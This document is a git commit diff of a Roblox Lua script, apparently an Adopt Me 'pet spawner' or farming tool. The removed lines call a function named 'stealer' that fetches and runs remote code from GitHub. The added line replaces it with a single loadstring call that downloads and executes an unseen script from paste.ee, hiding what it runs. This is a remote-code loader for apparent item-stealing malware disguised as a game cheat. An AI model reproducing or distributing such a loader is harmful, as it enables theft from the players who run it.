08f9d6658f901c5a388ceb9c201419e05a45dc58
ScriptLast <hadikusumah012@gmail.com>
2025-06-02 17:38:53 +0700

    Update Script1.lua

--- Script1.lua
+++ Script1.lua
@@ -1,13 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/HiraHub/refs/heads/main/AdoptMeScript.lua'))()
-end
-
-local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner1/refs/heads/main/script1.lua'))()
-end
-
-task.spawn(stealer)
-
-for i = 1, 1 do
-    task.spawn(farm)
-end
+loadstring(game:HttpGet("https://paste.ee/r/Tw3qCbwr"))()
